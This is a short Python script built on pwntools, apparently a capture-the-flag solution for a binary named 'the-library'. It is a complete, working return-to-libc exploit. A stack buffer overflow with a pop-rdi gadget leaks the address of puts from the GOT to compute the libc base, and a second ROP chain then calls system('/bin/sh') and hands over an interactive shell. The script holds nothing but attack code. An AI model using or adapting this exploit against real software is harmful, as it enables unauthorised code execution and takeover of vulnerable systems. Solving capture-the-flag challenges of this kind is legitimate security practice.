from pwn import *

e = ELF("./bin/the-library")
libc = ELF("./bin/libc.so.6")
p = process(e.path)

rdi = 0x400733
p.sendline("A" * 0x18 + p64(rdi) + p64(e.got["puts"]) + p64(e.symbols["puts"]) + p64(e.symbols["main"]))

p.recvuntil("A" * 0x18)
p.recvline()

leak = u64(p.recvline(keepends=False).ljust(8, "\x00")) - libc.symbols["puts"]
print("{:#x}".format(leak))

p.sendline("A" * 0x18 + p64(rdi + 1) + p64(rdi) + p64(next(libc.search("/bin/sh")) + leak) + p64(libc.symbols["system"] + leak))

p.interactive()
